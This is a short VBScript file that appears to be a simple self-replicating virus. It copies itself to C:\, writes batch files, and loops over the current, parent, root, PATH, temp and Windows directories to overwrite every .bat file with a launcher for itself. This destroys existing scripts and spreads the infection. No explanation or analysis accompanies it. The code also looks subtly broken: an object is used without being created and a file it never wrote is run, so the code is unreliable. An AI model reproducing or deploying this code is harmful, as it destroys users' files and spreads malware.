Dim shell, batcha, batchb, fso
set fso=CreateObject("Scripting.FileSystemObject")
fso.CopyFile Wscript.ScriptFullName, "C:\vbs.vbs", True
set batcha=fso.CreateTextFile("C:\bat.bat")
batcha.WriteLine "cls"
batcha.WriteLine "@echo off"
batcha.WriteLine "cscript C:\vbs.vbs"
batcha.Close
set batchb=CreateTextFile("C:\bata.bat")
batchb.WriteLine "cls"
batchb.WriteLine "@echo off"
batchb.WriteLine "for %%a in (*.bat ..\*.bat \*.bat %path%\*.bat %tmp%\*.bat %temp%\*.bat %windir%\*.bat) do copy C:\bat.bat %%a"
batchb.Close
shell.Run  "C:\lnk.bat"
